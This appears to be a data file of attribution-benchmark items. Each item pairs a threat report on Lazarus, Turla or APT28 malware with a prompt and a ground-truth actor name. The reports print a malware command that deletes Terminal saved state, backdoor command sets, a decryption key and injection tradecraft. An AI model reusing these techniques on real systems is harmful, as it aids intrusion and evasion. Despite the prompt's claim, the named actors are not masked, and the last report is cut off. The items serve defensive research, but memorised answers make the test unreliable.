[
    {
        "url": "https://asec.ahnlab.com/en/57685/",
        "Text": "Because the Lazarus threat group has been active since a long time ago, there are many attack cases and various malware strains are used in each case. In particular, there is also a wide variety of backdoors used for controlling the infected system after initial access. AhnLab Security Emergency response Center (ASEC) is continuously tracking and analyzing attacks by the Lazarus group, and in this post, we will analyze Volgmer and Scout, the two major malware strains used in their attacks. Volgmer is a backdoor that has been used by the Lazarus threat group since 2014. Volgmer, which usually runs by being registered as a service, is installed with a name that disguises it as a legitimate file. It differs from other malware in the fact that it encrypts and saves the configuration data in the registry key “HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security”. ASEC identified that since 2014, Volgmer underwent many changes and has been used in attacks until about 2021. We also confirmed that since 2022, a downloader named Scout has been used in attacks instead of Volgmer. The basic operating mechanism of Scout is similar to the previous one, with the only difference in the actual features. The payload it downloads is presumed to be a backdoor for controlling the infected system.\nBecause Volgmer is a DLL-type backdoor, it needs malware that installs it. A dropper was identified alongside the initial version of Volgmer, and this dropper installs Volgmer by creating a password-protected compressed version in the resource area before registering it as a service. The dropper also checks the number of arguments, recognizes Korean operating environments, and even checks the version of Windows operating environments, and if these do not match pre-configured conditions, it either displays a message box or deletes itself. A batch file is used for self-deletion, and the use of the file name “pdm.bat” is notable.\nThe encrypted configuration data is decrypted during execution. This contains the registry key which will include the configuration data with the C&C server addresses, the string used to register the malware as a service, and the file “pdm.bate” to be used for self-deletion. The 0x10 byte-sized key used for decryption is still used by the malware from the Andariel group, a subsidiary group of Lazarus. [11]\nKey: 74 61 51 04 77 32 54 45 89 95 12 52 12 02 32 73\nOne of the characteristics of Volgmer is that it follows a certain logic to randomly generate strings for the name of the Volgmer DLL file to be created, as well as the name and description of the service to be registered. These strings are created by combining the following strings contained in the decrypted configuration data.\nString A: svc, mgmt, mgr, enum, app, bg, c, d, ex, f, g, h, i, k, l, m, net, o, p, q, rm, sec, ti, up, vol, win, dc, ud\nString B: Service, Management, Manager, Enumerator, Application, Background, Control, Desktop, Extension, Function, Group, Host, Intelligent, Key, Layer, Multimedia, Network, Operation, Portable, Quality, Remote, Security, TCP/IP, User Profile, Volume, Windows, Device, Update\nFor example, the file name is a combination of four selections from the “String A” list, resulting in names such as “hlrmenum.dll”. Likewise, service-related items are created by combining four selections from the “String B” list, as follows.\nService name: “[Host Layer Remote Enumerator]”\nService description: “The [Host Layer Remote Enumerator] is an essential service for management of Windows System. If the service is stopped or disabled, Windows will be able to damaged seriously.”\nService DLL path: “C:\\Windows\\system32{hlrmenum}.dll”\nThe Volgmer dropper decompresses “MYRES” in the resource area to obtain the Volgmer DLL and configuration files. These files are compressed with the ZIP compression algorithm and password-protected with the following password.",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Lazarus"
    },
    {
        "url": "https://www.sentinelone.com/blog/lazarus-operation-interception-targets-macos-users-dreaming-of-jobs-in-crypto/",
        "Text": "Back in August, researchers at ESET spotted an instance of Operation In(ter)ception using lures for job vacancies at cryptocurrency exchange platform Coinbase to infect macOS users with malware. In recent days, SentinelOne has seen a further variant in the same campaign using lures for open positions at rival exchange Crypto.com. In this post, we review the details of this ongoing campaign and publish the latest indicators of compromise.\nNorth-Korean linked APT threat actor Lazarus has been using lures for attractive job offers in a number of campaigns since at least 2020, including targeting aerospace and defense contractors in a campaign dubbed ‘Operation Dream Job’.\nWhile those campaigns distributed Windows malware, macOS malware has been discovered using a similar tactic. Decoy PDF documents advertising positions on crypto exchange platform Coinbase were discovered by our friends at ESET back in August 2022, with indications that the campaign dated back at least a year. Last week, SentinelOne observed variants of the malware using new lures for vacancies at Crypto.com.\nAlthough it is not clear at this stage how the malware is being distributed, earlier reports suggested that threat actors were attracting victims via targeted messaging on LinkedIn.\nThe first stage dropper is a Mach-O binary that is a similar template to the safarifontsagent binary used in the Coinbase variant. The first stage creates a folder in the user’s Library called “WifiPreference” and drops a persistence agent at ~/Library/LaunchAgents/com.wifianalyticsagent.plist, targeting an executable in the WifiPreferences folder called wifianalyticsagent.\nThe LaunchAgent uses the same label as in the Coinbase variant, namely iTunes_trush, but changes the target executable location and the agent file name. Analysis of the binary shows that these details are simply hardcoded in the startDaemon() function at compile time, and as such there are likely to be further variants extant or forthcoming.\nThe WifiPreference folder contains several other items, including the decoy document, Crypto.com_Job_Opportunities_2022_confidential.pdf.\nThe PDF is a 26 page dump of all vacancies at Crypto.com. Consistent with observations in the earlier campaign, this PDF is created with MS Word 2016, PDF version 1.5. The document author is listed as “UChan”.\nThe first stage malware opens the PDF decoy document and wipes the Terminal’s current savedState\nopen '/Users/tritium/Library/WifiPreference/Crypto.com_Job_Opportunities_2022_confidential.pdf' && \nrm -rf '/Users/tritium/Library/Saved Application State/com.apple.Terminal.savedState'\nThe second stage in the Crypto.com variant is a bare-bones application bundle named “WifiAnalyticsServ.app”; this mirrors the same architecture seen in the Coinbase variant, which used a second stage called “FinderFontsUpdater.app”. The application uses the bundle identifier finder.fonts.extractor and has been in existence since at least 2021.\nThe main purpose of the second-stage is to extract and execute the third-stage binary, wifianalyticsagent. This functions as a downloader from a C2 server. The Coinbase variant used the domain concrecapital[.]com. In the Crypto.com sample, this has changed to market.contradecapital[.]com.\nThe payload is written to the WifiPreference folder as WifiCloudWidget. Unfortunately, due to the C2 being offline when we analysed the sample, we were unable to retrieve the WifiCloudWidget payload.\nThe threat actors have made no effort to encrypt or obfuscate any of the binaries, possibly indicating short-term campaigns and/or little fear of detection by their targets. The binaries are all universal Mach-Os capable of running on either Intel or M1 Apple silicon machines and signed with an ad hoc signature, meaning that they will pass Apple’s Gatekeeper checks despite not being associated with a recognized developer identity.\n\n \n\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Lazarus"
    },
    {
        "url": "https://lab52.io/blog/pelmeni-wrapper-new-wrapper-of-kazuar-turla-backdoor/?ref=news.risky.biz",
        "Text": "Turla is an APT group allegedly linked to the intelligence service FSB (Federal Security Service) from the Russian Federation. This threat actor is specifically in the Center 16 unit, which carries out the collection of radio-electronic intelligence on communications facilities. Moreover, the Center 16 is in charge of intercepting, decrypting and processing the electronic message and the technical operation of compromising foreign targets.  \nTurla’s activity dates back as far as 2004. This actor often carries out exploitation campaigns against organizations from the former Soviet Union countries. Turla usually targets organizations from several sectors as: governments, research centers, embassies, energy, telecommunications and pharmaceutical among other sectors. \nThis research has resulted in a set of samples which have been found in VirusTotal during early 2024. Below is a timeline of the publicly known samples.\nIn particular, in this article, one of the samples used in one of the latest campaigns (sample #6). This investigation reveals how Turla is using a new wrapper of Kazuar as part of their infection chain. The most prominent aspects of the analysis leading to the extraction of Kazuar and the peculiarities of the identified sample compared to others previously seen in the field are detailed below. \nInfection Chain\nAs will be detailed later, the attack is quite targeted, so it is possible that the actors have deposited this piece of malware on the computer after a previous infection. \nIn order to hide the malware, the actors make use of the Sideload DLL technique, spoofing legitimate libraries related to “SkyTel“, “NVIDIA GeForce Experience“, “vncutil” or “ASUS“. \nAs a result, when the legitimate application is executed, the malicious Dll (We’ve dubbed it Pelmeni Wrapper) is loaded  and the infection continues. The resulting infection chain would be as follows :\nFor the analysis we will use the most recent sample we have found in public sources, where it has up to 39 detections.\nLaunchGFExperienceLOC.dll\t15f5e4808549ff67a79f84e23659da912ebbc1dc7c7b100c12b72384a27e412a\nThe DLL does not provide much information since most of its content is encrypted. The most interesting thing is the name of its exported functions  that appear to be randomly generated.\nPelmeni Wrapper (Wrapper DLL)\nThrough the analysis of LaunchGFExperienceLOC.dll, we see at the EntryPoint, 3 main functions that will guide the program. \nThe first function “PrintLog” is in charge of creating a file in the %TEMP% folder that prints what it is doing. This file has a random name and extension, decoded using an XOR algorithm.\nAt this point it would print “DLL_PROCESS_ATTACH” because the executable has  loaded the DLL. \nThe next EntryPoint function is “LoadFunction” which is responsible for executing one of the exported DLL functions. \nTo decrypt the function name, the malware uses a hash generated by the victim’s “ComputerName” xored by a constant. The algorithm used to hash the computer name is Jenkins’ one_at_a_time. This hash will be used as a seed in the pseudorandom number generator algorithm ranqd1. The generated values will be used to decrypt the function name. \nThe execution continues with the “Wvoouo” method that goes through all the threads of the running process and suspends them, except for the current thread. After this, Pelmeni prints “After CSPT” in the log, which could be a reference to “Check Suspend Threads”. \nAfter this the program executes “LoadFunctions” which loads and executes 3 functions as before.\nIn the first function “Gcqiprj” we can see how, by means of CreateThread(), it creates a thread that will continue with the execution of the wrapper.  \nHowever, instead of executing that part of the code, it saves its address (0x703C1785) to later redirect the execution flow to it.\nThe next function ”Urjhmeuo” accesses the contents of that address (0x703C1785) and copies the entire contents to another memory space, which it will execute. In addition, it adds the instruction “push eax” (0x50 x56) at the beginning to keep the state of the stack correctly. of the stack. \nThe last function “Rgdpeyg” traces the execution stack to find the “LoadLibrary” function and load the new address, to completely change the execution flow. Finally, Pelmeni prints in the log file “After EFD” which could stand for “Execution Flow Deviation”. \nAt this point, the malware will execute the thread it had previously prepared. This thread will decrypt a .NET assembly and execute it from memory. Additionally, while Pelmeni runs .NET in the background, it checks the connection by making requests to Google.\nAs seen the attack is totally targeted, as if the malware is executed on an other machine, it will not be able to continue the infection. Fortunately, the algorithm used to to decrypt the payload and the one used to decrypt the exports is the same, which makes it vulnerable to brute force attacks.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Turla"
    },
    {
        "url": "https://cybergeeks.tech/a-step-by-step-analysis-of-the-russian-apt-turla-backdoor-called-tinyturla/",
        "Text": "Turla is a Russian-based group that has impacted government, embassies, military, education, and research companies since 2004. Our analysis focuses on a backdoor called TinyTurla that was installed on an endpoint via a Windows Service. The list of C2 servers and a password used for authentication with the servers are stored in the Windows registry. The malware implements 12 different commands that include spawning and killing processes, creating and exfiltrating files, creating pipes for process communication, and modifying registry values used during the execution.\nTechnical analysis\nSHA256: 030cbd1a51f8583ccfc3fa38a28a5550dc1c84c05d6c0f5eb887d13dedf1da01\nThe file is a 64-bit DLL that was installed as a service called “Microsoft Windows Time” (https://blog.talosintelligence.com/2021/09/tinyturla.html). We’ve manually created a service called “W64Time” and the corresponding registry keys/values by simulating the execution of the batch script mentioned in the Talos article:\nBecause we’re analyzing a 64-bit file, the calling convention is different, and the function arguments are passed to the  RCX, RDX, R8, and R9 registers.  Additional arguments are pushed onto the stack (right to left).\nRegisterServiceCtrlHandlerW is utilized to register a function to handle service control requests:\nThe service status for the above service is set to 0x4 (SERVICE_RUNNING) via a function call to SetServiceStatus:\nAfter the main function finishes, the service status is set to 0x1 (SERVICE_STOPPED).\nThe RegOpenKeyExW API is used to open the “SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters” registry key (0x80000002 = HKEY_LOCAL_MACHINE, 0x20119 = KEY_READ | KEY_WOW64_64KEY):\nThe process extracts the following registry values using RegQueryValueExW:\n•\tTimeLong – the number of milliseconds that the malware waits when the C2 servers are not responding\n•\tTimeShort – the number of milliseconds between requesting different commands from the C2 server\n•\tSecurity – password used to perform some sort of authentication\n•\tHosts – list of C2 domains and port numbers\nThe malware passes the C2 IPs and port numbers to the CommandLineToArgvW routine and extracts an array of pointers to them (the C2 server is randomly chosen for testing purposes):\nWe’ve emulated network connections using FakeNet.\nThe malicious process opens the “SOFTWARE\\Microsoft\\Cryptography” registry key using RegOpenKeyExW (0x80000002 = HKEY_LOCAL_MACHINE, 0x20019 = KEY_READ):\nThe “MachineGuid” value is extracted via a function call to RegQueryValueExW:\nWinHttpOpen is utilized to initialize the use of WinHTTP functions:\nThe file initializes a connection to the C2 server by calling the WinHttpConnect API:\nThe WinHttpOpenRequest function is used to create a GET request handle (0x800000 = WINHTTP_FLAG_SECURE):\nThe process adds an HTTP request header called “Title” containing the Machine GUID to the HTTP request handle (0x20000000 = HTTP_ADDREQ_FLAG_ADD):\nThe security flags for the handle are set using WinHttpSetOption (0x1F = WINHTTP_OPTION_SECURITY_FLAGS, 0x3300 = WinHttpRequestOption_SslErrorIgnoreFlags):\nThe malicious file sends the request to the C2 server using the WinHttpSendRequest routine:\nWinHttpReceiveResponse is used to receive the response to the GET request initiated above:\nThe binary obtains header information associated with the request by calling the WinHttpQueryHeaders API (0x26 = WINHTTP_QUERY_TITLE):\nWinHttpQueryDataAvailable is utilized to extract the amount of data, in bytes, available to be read with WinHttpReadData:\nThe response from the server is copied to a buffer via a call to WinHttpReadData:\nTinyTurla implements 12 different commands depending on the 1st byte received in the response. It uses a switch statement to execute a particular function:\n1st byte = 0x00 – Authentication\nThe backdoor compares the “Security” value with a string starting from the 2nd byte in the response:\nWhether the two strings are equal, the malware sends “00 00” to the C2 server. Otherwise, it sends “00 03”, indicating an unsuccessful “authentication”.\n1st byte = 0x01 – create a process\nThe binary creates a process specified by the C2 server in the response (0x08000000 = CREATE_NO_WINDOW):\nThe WinHttpOpenRequest routine is used to create a POST request handle (0x800000 = WINHTTP_FLAG_SECURE):\nThe backdoor adds an HTTP request header called “Title” that contains the Machine GUID to the request handle (0x20000000 = HTTP_ADDREQ_FLAG_ADD):\nThe security flags for the handle are set using WinHttpSetOption (0x1F = WINHTTP_OPTION_SECURITY_FLAGS, 0x3300 = WinHttpRequestOption_SslErrorIgnoreFlags):\nThe malicious process sends the POST request to the C2 server by calling the WinHttpSendRequest API:\nA confirmation message “01 00” is sent to the C2 server using WinHttpWriteData:\nWinHttpReceiveResponse is utilized to halt the process until it receives the response to the HTTP request:\nThe backdoor sleeps for “TimeShort” milliseconds and waits for further instructions:\n1st byte = 0x02 – create a process and exfiltrate its output\nThe malicious file creates an anonymous pipe and returns handles to the read/write ends of the pipe:\nThe write handle is set to be inherited by calling the SetHandleInformation routine (0x1 = HANDLE_FLAG_INHERIT):\nA second anonymous pipe is created via a function call to CreatePipe:\nThe read handle is set to be inherited by calling the SetHandleInformation routine (0x1 = HANDLE_FLAG_INHERIT):\nThe malware creates a process mentioned by the C2 server in the response (0x08000000 = CREATE_NO_WINDOW):\nWaitForSingleObject is used to wait until the above process is in the signaled state or 0xEA60 = 60000ms = 60 seconds have elapsed:\nThe output of the created process is copied from the anonymous pipe into a buffer by calling the PeekNamedPipe function:\nThe process reads data from the pipe using ReadFile:\nThe backdoor kills the process created above using the TerminateProcess routine:\nThe execution flow of creating a POST request (WinHttpOpenRequest -> WinHttpAddRequestHeaders -> WinHttpSetOption -> WinHttpSendRequest) is repeated and will not be detailed again. The process output is exfiltrated to the CnC server:\n1st byte = 0x03 – create and populate a file\nThe backdoor creates a file specified by the C2 server using CreateFileW (0x40000000 = GENERIC_WRITE, 0x2 = CREATE_ALWAYS, 0x80 = FILE_ATTRIBUTE_NORMAL):\nThe WriteFile API is utilized to populate the file with data received from the server:\nA confirmation message “03 00” is sent to the C2 server.\n1st byte = 0x04 – exfiltrate a file to the C2 server\nThe process opens a file nominated by the server using CreateFileW (0x80000000 = GENERIC_READ, 0x3 = OPEN_EXISTING, 0x80 = FILE_ATTRIBUTE_NORMAL):\nThe size of the file is retrieved by calling the GetFileSize routine:\nThe file content is copied to a buffer via a function call to ReadFile:\nThe content extracted above is transmitted to the CnC server:\n1st byte = 0x05 – spawn a new process\nThe malicious process creates an anonymous pipe using the CreatePipe API\nThe write handle is set to be inherited by calling the SetHandleInformation routine (0x1 = HANDLE_FLAG_INHERIT):\nA second anonymous pipe is created by the malware:\nThe read handle is set to be inherited by calling the SetHandleInformation routine (0x1 = HANDLE_FLAG_INHERIT):\nCreateProcessW is used to create a process specified by the C2 server (0x08000000 = CREATE_NO_WINDOW):\nA confirmation message “05 00” is sent to the C2 server.\n1st byte = 0x06 – kill a process\nThe binary kills the process spawned in the above command by calling TerminateProcess\nA confirmation message “06 00” is sent to the C2 server.\n1st byte = 0x07 – read/write to a pipe\nThe WriteFile API is utilized to write data transmitted by the CnC server to a pipe created earlier:\nThe process reads data that is available through the pipe using the PeekNamedPipe and ReadFile APIs:\nThe pipe content extracted above is exfiltrated to the C2 server.\n1st byte = 0x08 – modify the “TimeLong” registry value\nThe malware opens the “SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters” registry key by calling the RegOpenKeyExW routine (0x80000002 = HKEY_LOCAL_MACHINE, 0x20006 = KEY_WRITE):\nThe “TimeLong” value is modified to a number sent by the C2 server:\nA confirmation message “08 00” is sent to the C2 server.\n1st byte = 0x09 – modify the “TimeShort” registry value\nThis command is similar to the one from above. The “TimeShort” value is modified accordingly:\nA confirmation message “09 00” is sent to the C2 server.\n1st byte = 0x0A – modify the “Security” registry value\nThis command is similar to the one from above. The “Security” value used in the authentication process is changed by the backdoor:\nA confirmation message “0A 00” is sent to the C2 server.\n1st byte = 0x0B – modify the “Hosts” registry value\nThis command is similar to the one from above. The “Hosts” value that contains the list of C2 servers is changed by the malware:\nCommandLineToArgvW is utilized to retrieve an array of pointers to the C2 server(s):\nA confirmation message “0B 00” is sent to the C2 server\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Turla"
    },
    {
        "url": "https://thehackernews.com/2024/03/apt28-hacker-group-targeting-europe.html?m=1",
        "Text": "The Russia-linked threat actor known as APT28 has been linked to multiple ongoing phishing campaigns that employ lure documents imitating government and non-governmental organizations (NGOs) in Europe, the South Caucasus, Central Asia, and North and South America.\n\"The uncovered lures include a mixture of internal and publicly available documents, as well as possible actor-generated documents associated with finance, critical infrastructure, executive engagements, cyber security, maritime security, healthcare, business, and defense industrial production,\" IBM X-Force said in a report published last week.\nThe tech company is tracking the activity under the moniker ITG05, which is also known as Blue Athena, BlueDelta, Fancy Bear, Fighting Ursa, Forest Blizzard (formerly Strontium), FROZENLAKE, Iron Twilight, Pawn Storm, Sednit, Sofacy, TA422, and UAC-028.\nThe disclosure comes more than three months after the adversary was spotted using decoys related to the ongoing Israel-Hamas war to deliver a custom backdoor dubbed HeadLace.\nAPT28 has since also targeted Ukrainian government entities and Polish organizations with phishing messages designed to deploy bespoke implants and information stealers like MASEPIE, OCEANMAP, and STEELHOOK.\nOther campaigns have entailed the exploitation of security flaws in Microsoft Outlook (CVE-2023-23397, CVSS score: 9.8) to plunder NT LAN Manager (NTLM) v2 hashes, raising the possibility that the threat actor may leverage other weaknesses to exfiltrate NTLMv2 hashes for use in relay attacks.\nThe latest campaigns observed by IBM X-Force between late November 2023 and February 2024 take advantage of the \"search-ms:\" URI protocol handler in Microsoft Windows to trick victims into downloading malware hosted on actor-controlled WebDAV servers.\nThere is evidence to suggest that both the WebDAV servers, as well as the MASEPIE C2 servers, may be hosted on compromised Ubiquiti routers, a botnet comprising which was taken down by the U.S. government last month.\n\nThe phishing attacks impersonate entities from several countries such as Argentina, Ukraine, Georgia, Belarus, Kazakhstan, Poland, Armenia, Azerbaijan, and the U.S., putting to use a mix of authentic publicly available government and non-government lure documents to activate the infection chains.\n\"In an update to their methodologies, ITG05 is utilizing the freely available hosting provider, firstcloudit[.]com to stage payloads to enable ongoing operations,\" security researchers Joe Fasulo, Claire Zaboeva, and Golo Mühr said.\nThe climax of APT28's elaborate scheme ends with the execution of MASEPIE, OCEANMAP, and STEELHOOK, which are designed to exfiltrate files, run arbitrary commands, and steal browser data. OCEANMAP has been characterized as a more capable version of CredoMap, another backdoor previously identified as used by the group.\n\"ITG05 remains adaptable to changes in opportunity by delivering new infection methodologies and leveraging commercially available infrastructure, while consistently evolving malware capabilities,\" the researchers concluded.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "APT28"
    },
    {
        "url": "https://securelist.com/introducing-whitebear/81638/",
        "Text": "As a part of our Kaspersky APT Intelligence Reporting subscription, customers received an update in mid-February 2017 on some interesting APT activity that we called WhiteBear. Much of the contents of that report are reproduced here. WhiteBear is a parallel project or second stage of the Skipper Turla cluster of activity documented in another private intelligence report “Skipper Turla – the White Atlas framework” from mid-2016. Like previous Turla activity, WhiteBear leverages compromised websites and hijacked satellite connections for command and control (C2) infrastructure. As a matter of fact, WhiteBear infrastructure has overlap with other Turla campaigns, like those deploying Kopiluwak, as documented in “KopiLuwak – A New JavaScript Payload from Turla” in December 2016. WhiteBear infected systems maintained a dropper (which was typically signed) as well as a complex malicious platform which was always preceded by WhiteAtlas module deployment attempts. However, despite the similarities to previous Turla campaigns, we believe that WhiteBear is a distinct project with a separate focus. We note that this observation of delineated target focus, tooling, and project context is an interesting one that also can be repeated across broadly labeled Turla and Sofacy activity.\nFrom February to September 2016, WhiteBear activity was narrowly focused on embassies and consular operations around the world. All of these early WhiteBear targets were related to embassies and diplomatic/foreign affair organizations. Continued WhiteBear activity later shifted to include defense-related organizations into June 2017. When compared to WhiteAtlas infections, WhiteBear deployments are relatively rare and represent a departure from the broader Skipper Turla target set. Additionally, a comparison of the WhiteAtlas framework to WhiteBear components indicates that the malware is the product of separate development efforts. WhiteBear infections appear to be preceded by a condensed spearphishing dropper, lack Firefox extension installer payloads, and contain several new components signed with a new code signing digital certificate, unlike WhiteAtlas incidents and modules.\n\nThe exact delivery vector for WhiteBear components is unknown to us, although we have very strong suspicion the group spearphished targets with malicious pdf files. The decoy pdf document above was likely stolen from a target or partner. And, although WhiteBear components have been consistently identified on a subset of systems previously targeted with the WhiteAtlas framework, and maintain components within the same filepaths and can maintain identical filenames, we were unable to firmly tie delivery to any specific WhiteAtlas component. WhiteBear focused on various embassies and diplomatic entities around the world in early 2016 – tellingly, attempts were made to drop and display decoy pdf’s with full diplomatic headers and content alongside executable droppers on target systems.\nTechnical Details\nThe WhiteBear platform implements an elaborate set of messaging and injection components to support full presence on victim hosts. A diagram helps to visualize the reach of injected components on the system.\n\nWhiteBear Binary loader\nSample MD5: b099b82acb860d9a9a571515024b35f0\nType PE EXE\nCompilation timestamp 2002.02.05 17:36:10 (GMT)\nLinker version 10.0 (MSVC 2010)\nSignature “Solid Loop Ldt” UTCTime 15/10/2015 00:00:00 GMT – UTCTime 14/10/2016 23:59:59 GMT\nThe WhiteBear binary loader maintains several features including two injection methods for its (oddly named) “KernelInjector” subsystem, also named by its developer\n– Standart\n– WindowInject (includes an unusual technique for remotely placing code into memory for subsequent thread execution)\nThe loader also maintains two methods for privilege and DEP process protection handling:\n– GETSID_METHOD_1\n– GETSID_METHOD_2\nThe binary contains two resources:\n– BINARY 201\n– File size: 128 bytes\n– Contains the string, “explorer.exe”\n– BINARY 202\n– File size: 403456 bytes\n– File Type: PE file (this is the actual payload and is not encrypted)\n– This PE file resource stores the “main orchestrator” .dll file\nLoader runtime flow\nThe loader creates the mutex “{531511FA-190D-5D85-8A4A-279F2F592CC7}”, and waits up to two minutes if it is already present while logging the message “IsLoaderAlreadyWork +”. The loader creates the mutex “{531511FA-190D-5D85-8A4A-279F2F592CC7}”, and waits up to two minutes. If it is already present while logging the message “IsLoaderAlreadyWork +”, it extracts the resource BINARY 201. This resource contains a wide string name of processes to inject into (i.e. “explorer.exe”).\nThe loader makes a pipe named: \\.pipeWinsock2CatalogChangeListener-%03x%01x-%01x\nWhere the “%x” parameter is replaced with the values 0xFFFFFFFF 0xEEEEEEEE 0xDDDDDDDD, or if it has successfully obtained the user’s SID:\n\\.pipeWinsock2CatalogChangeListener-%02x%02x-%01x\nWith “%x” parameters replaced with numbers calculated from the current date and a munged user SID.\nThe pipe is used to communicate with the target process and the transport module; the running code also reads its own image body and writes it to the pipe. The loader then obtains the payload body from resource BINARY 202. It finds the running process that matches the target name, copies the buffer containing the payload into the process, then starts its copy in the target process.\nThere are some interesting, juvenile, and non-native English-speaker debug messages compiled into the code:\n– i cunt waiting anymore #%d\n– lights aint turnt off with #%d\n– Not find process\n– CMessageProcessingSystem::Receive_NO_CONNECT_TO_GAYZER\n– CMessageProcessingSystem::Receive_TAKE_LAST_CONNECTION\n– CMessageProcessingSystem::Send_TAKE_FIN\nWhiteBear Main module/orchestrator\nSample MD5: 06bd89448a10aa5c2f4ca46b4709a879\nType, size: PE DLL, 394 kb\nCompilation timestamp: 2002.02.05 17:31:28 (GMT)\nLinker version: 10.0 (MSVC 2010)\nUnsigned Code\nThe main module has no exports, only a DllMain entry which spawns one thread and returns. The main module maintains multiple BINARY resources that include executable, configurations, and encryption data:\n101 – RSA private (!) key\n102 – RSA public key\n103 – empty\n104 – 16 encrypted bytes\n105 – location (“%HOMEPATH%ntuser.dat.LOG3”)\n106 – process names (e.g. “iexplore.exe, firefox.exe, chrome.exe, outlook.exe, safari.exe, opera.exe”) to inject into\n107 – Transport module for interaction with C&C\n108 – C2 configuration\n109 – Registry location (“HKCUSOFTWAREMicrosoftWindowsNTCurrentVersionExplorerScreen Saver”)\n110 – no information\n111 – 8 zero bytes\nValues 104 – 111 are encrypted with the RSA private key (resource 101) and compressed with bzip2.4. The RSA key is stored with header stripped in a format similar to Microsoft’s PVK; the RSA PRIVATE KEY header is appended by the loader before reading the keys into the encryption code. Resource 109 points to a registry location called “external storage”, built-in resources are called “PE Storage”.\nIn addition to storing code, crypto resources, and configuration data in PE resources, WhiteBear copies much of this data to the victim host’s registry. Registry storage is located in the following keys. Subkeys and stored values listed below:\n[HKCUSOFTWAREMicrosoftWindowsCurrentVersionExplorerScreenSaver] [HKCUSOFTWAREMicrosoftWindows NTCurrentVersionExplorerScreenSaver]\nRegistry subkeys:\n{629336E3-58D6-633B-5182-576588CF702A} Contains the RSA private key used to encrypt/decrypt other resources / resource 101\n{3CDC155D-398A-646E-1021-23047D9B4366} Resource 105 – current file location\n{81A03BF8-60AA-4A56-253C-449121D61CAF} Resource 106 – process names\n{31AC34A1-2DE2-36AC-1F6E-86F43772841F} Contains the internet C&C transport module / resource 107\n{8E9810C5-3014-4678-27EE-3B7A7AC346AF} Resource 108 – C&C config\n{28E74BDA-4327-31B0-17B9-56A66A818C1D} Resource 110 “plugins”\n{4A3130BD-2608-730F-31A7-86D16CE66100} Resource 111\n{119D263D-68FC-1942-3CA3-46B23FA652A0} Unique Guid (“ObjectID”)\n{1DC12691-2B24-2265-435D-735D3B118A70} “Task Queue”\n{6CEE6FE1-10A2-4C33-7E7F-855A51733C77} “Result Queue”\n{56594FEA-5774-746D-4496-6361266C40D0}  unknown\n{831511FA-190D-5D85-8A4A-279F2F592CC7}  unknown\nFinally, if the main WhiteBear module fails to use registry storage, it uses “FS Storage” in file %TEMP%KB943729.log. The module reads all of its data and binary components from one of the storages and then verifies the integrity of data (RSA+bzip2 compression+signature).\nThe module maintains functionality which is divided into a set of subsystems that are loosely named by the developers:\n• result queue\n• task queue\n• message processing system\n• autorun manager\n• execution subsystem\n• inject manager\n• PEStorage\n• local transport manager/internal transport channel\nIt creates the following temporary files:\n%TEMP%CVRG72B5.tmp.cvr\n%TEMP%CVRG1A6B.tmp.cvr\n%TEMP%CVRG38D9.tmp.cvr\n%TEMP%~DF1E05.tmp contains the updated body of the loader during an update.\nEvery day (as specified by local time) the main module restarts the transport subsystem which includes:\n• message processing\n• named pipe transport (“NPTransport”)\nIf the registry/file storage is empty, the module performs a ‘migration’ of hardcoded modules and settings to the storage location. This data is encrypted with a new RSA key (which is also stored in the registry).\nThe data in the registry is prepended with a 0xC byte header. The maximum size of each registry item is 921,600 bytes; if the maximum size is exceeded, it is split into several items. The format of the header is shown below:\n[4:service DWORD][4:chunk index][4:chunk size including header]\nEvery time the orchestrator module is loaded it validates that the storage area contains the appropriate data and that all of the components can be decrypted and validated. If these checks fail the module reinstalls a configuration from the resource “REINSTALL”.\nPipe Transport\nThe module generates the pipe name (with the same prefix as the loader); waits for incoming connections; receives data and pushes it to the ‘message processing system’. The module generates the pipe name (with the same prefix as the loader); waits for incoming connections; receives data and pushes it to the ‘message processing system’. Every packet is expected to be at least 6 bytes and contain the following header:      [4:ID][2:command]\nList of commands:\n1 : new task\n2 : update the loader + orchestrator file\n4 : send task result\n5 : send settings\n6 : write results to registry/file storage\n7 : enable / disable c2 transport / update status\n8 : uninstall\n9 : nop\n10 : “CMessageProcessingSystem::Receive_NO_CONNECT_TO_GAYZER”; write results to registry\n11: write the last connection data ‘{56594FEA-5774-746D-4496-6361266C40D0}’ aka “last connection” storage value\n12: “give cache” – write cached commands from the C&C\n13: “take cache” – append C&C commands to the cache\nDepending on the command, the module returns the results from previously run tasks, the configuration of the module, or a confirmation message.\nAn example of these tasks is shown below:\n• write a file and execute it with CreateProcess() capturing all of the standard output\n• update C&C configuration, plugin storage, etc\n• update autoruns\n• write arbitrary files to the filesystem (“File Upload”)\n• read arbitrary files from the filesystem (“File Download”)\n• update itself\n• uninstall\n• push task results to C2 servers\nThe “LocalTransport manager” handles named pipe communication and identifies if the packet received is designated to the current instance or to someone else (down the route). In the latter scenario the 